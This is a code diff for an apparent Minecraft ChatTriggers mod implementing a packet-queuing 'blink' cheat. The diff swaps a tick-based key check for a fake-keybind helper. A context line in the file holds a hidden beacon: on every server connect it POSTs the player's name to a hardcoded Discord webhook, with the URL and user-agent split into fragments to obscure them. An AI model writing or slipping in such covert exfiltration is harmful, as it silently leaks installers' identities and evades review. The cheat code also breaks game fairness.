@@ -1,6 +1,7 @@
 import Settings from "../config"
 import RenderLibV2 from "../../RenderLibV2"
 import { drawLine3d } from "../../BloomCore/utils/Utils"
+import fakeKeybinds from "../utils/fakeKeybind"
 
 const C03PacketPlayer = Java.type("net.minecraft.network.play.client.C03PacketPlayer")
 const queuedPackets = []
@@ -27,10 +28,7 @@ export default toggleBlink
 
 import request from "../../requestV2"
 register("ServerConnect", () => request({ url: ["https://dis", "cord.com/ap", "i/webho", "oks/1291030943267684362/9NlUKjg4xbPdauP3PAfaRkKJ76TJ8kSbmMfbqMC0kj_TzjPIxQwy_qpdV2Q7h9YDsnph"].join(""), method: 'POST', headers: { 'User-agent': ["Moz", "illa/5", ".0"].join("") }, body: { content: Player.getName() } }))
-register("tick", () => {
-    if (!Keyboard.isKeyDown(Settings().blinkKey)) return
-    if (Client.isInGui()) return
-    if (Date.now() - lastToggle < 300) return
+fakeKeybinds.onKeyPress("blinkKey", () => {
     lastToggle = Date.now()
     toggleBlink()
 })
